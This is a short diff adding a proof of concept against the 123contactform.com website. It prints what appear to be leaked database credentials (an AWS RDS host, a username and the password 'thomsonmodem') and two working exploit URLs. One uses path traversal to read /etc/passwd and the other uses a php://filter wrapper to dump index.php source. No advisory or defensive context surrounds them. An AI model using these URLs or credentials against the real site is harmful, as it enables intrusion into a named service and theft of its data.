@@ -1,1 +1,12 @@
+POC :
+-------------
+$user='cf123'; 						
+$con_site = 'db123cf.copnr3blb7eu.us-east-1.rds.amazonaws.com';  // OLD: 64.64.9.77
+$con_user= $user.'_cf123';
+$con_password= 'thomsonmodem';
+$con_dbName = $user.'_123contactform';
+--------------
 
+https://www.123contactform.com/ajax_tour_loadpage.php?page_path=../../../../../../../etc/passwd
+
+https://www.123contactform.com/ajax_tour_loadpage.php?page_path=php://filter/read=convert.base64-encode/resource=index.php
